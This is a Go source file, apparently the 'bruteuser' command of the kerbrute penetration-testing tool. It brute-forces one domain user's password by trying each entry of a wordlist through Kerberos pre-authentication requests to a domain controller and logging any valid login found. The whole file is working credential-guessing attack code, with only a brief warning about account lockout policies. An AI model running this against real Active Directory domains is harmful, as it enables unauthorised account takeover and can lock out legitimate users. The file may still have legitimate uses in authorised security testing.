package cmd

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"github.com/ropnop/kerbrute/util"

	"github.com/spf13/cobra"
)

// bruteuserCmd represents the bruteuser command
var bruteuserCmd = &cobra.Command{
	Use:   "bruteuser [flags] <password_list> username",
	Short: "Bruteforce a single user's password from a wordlist",
	Long: `Will perform a password bruteforce against a single domain user using Kerberos Pre-Authentication by requesting at TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
WARNING: only run this if there's no lockout policy!`,
	Args:   cobra.ExactArgs(2),
	PreRun: setupSession,
	Run:    bruteForce,
}

func init() {
	rootCmd.AddCommand(bruteuserCmd)
}

func bruteForce(cmd *cobra.Command, args []string) {
	passwordlist := args[0]
	username, err := util.FormatUsername(args[1])
	if err != nil {
		logger.Log.Error(err.Error())
		return
	}

	file, err := os.Open(passwordlist)
	if err != nil {
		logger.Log.Error(err.Error())
		return
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	var password string
	count := 0
	start := time.Now()
	for scanner.Scan() {
		count++
		password = scanner.Text()
		login := fmt.Sprintf("%v@%v", username, domain)
		if ok, err := kSession.TestLogin(username, password); ok {
			logger.Log.Notice("[+] VALID LOGIN:\t %s : %s", login, password)
			break
		} else {
			// This is to determine if the error is "okay" or if we should abort everything
			ok, errorString := kSession.HandleKerbError(err)
			if !ok {
				logger.Log.Errorf("[!] %v - %v", login, errorString)
				return
			}
			logger.Log.Debugf("[!] %v - %v", login, errorString)
		}
	}
	logger.Log.Infof("Done! Tested %d passwords in %.3f seconds", count, time.Since(start).Seconds())

	if err := scanner.Err(); err != nil {
		logger.Log.Error(err.Error())
	}

}
